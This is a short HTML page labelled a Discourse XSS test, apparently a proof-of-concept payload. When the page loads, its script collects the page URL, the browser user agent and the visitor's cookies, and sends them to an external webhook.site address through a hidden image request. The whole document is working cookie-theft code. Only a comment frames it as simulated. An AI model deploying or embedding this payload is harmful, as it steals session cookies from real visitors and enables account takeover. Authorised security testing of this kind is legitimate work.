<!DOCTYPE html>
<html>
<head>
  <title>Discourse XSS Test</title>
</head>
<body>
  <h1>Discourse XSS Test Page</h1>

  <script>
    // Simulate data collection
    const payload = {
      url: window.location.href,
      userAgent: navigator.userAgent,
      cookies: document.cookie
    };

    // Encode data in query string
    const encoded = encodeURIComponent(JSON.stringify(payload));

    // Send to webhook via image request (CORS-safe)
    new Image().src = `https://webhook.site/aac76a2b-98fc-4651-a334-9290195913b3?data=${encoded}`;
  </script>
</body>
